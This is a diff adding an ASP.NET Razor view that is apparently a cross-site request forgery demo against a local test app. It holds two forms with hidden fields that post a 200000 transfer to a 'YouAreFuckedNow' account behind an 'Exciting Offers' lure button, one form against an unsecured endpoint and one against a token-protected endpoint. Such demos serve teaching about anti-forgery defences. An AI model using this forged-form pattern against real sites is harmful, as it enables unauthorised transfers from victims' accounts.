@@ -1,0 +1,23 @@
+﻿
+@{
+    ViewBag.Title = "Index";
+}
+
+<h2>Index</h2>
+
+<form method="post" action="http://localhost:58748/Account/ProcessTransferUnsecured">
+
+   <input type="hidden" name="Amount" id="Amount" value="200000"/>
+    <input type="hidden" name="TransferTo" id="TransferTo" value="YouAreFuckedNow" />
+    <input type="submit"  value="Unsecured -Click to get Exciting Offers!" />
+
+</form>
+
+<form method="post" action="http://localhost:58748/Account/ProcessTransferSecured">
+
+    <input type="hidden" id="Token" name="Token" value="e2c3ff3c-ba4b-4437-955d-78d2e6a43405">
+    <input type="hidden" name="Amount" id="Amount" value="200000" />
+    <input type="hidden" name="TransferTo" id="TransferTo" value="YouAreFuckedNow" />
+    <input type="submit" value="Secured- Click to get Exciting Offers!" />
+
+</form>
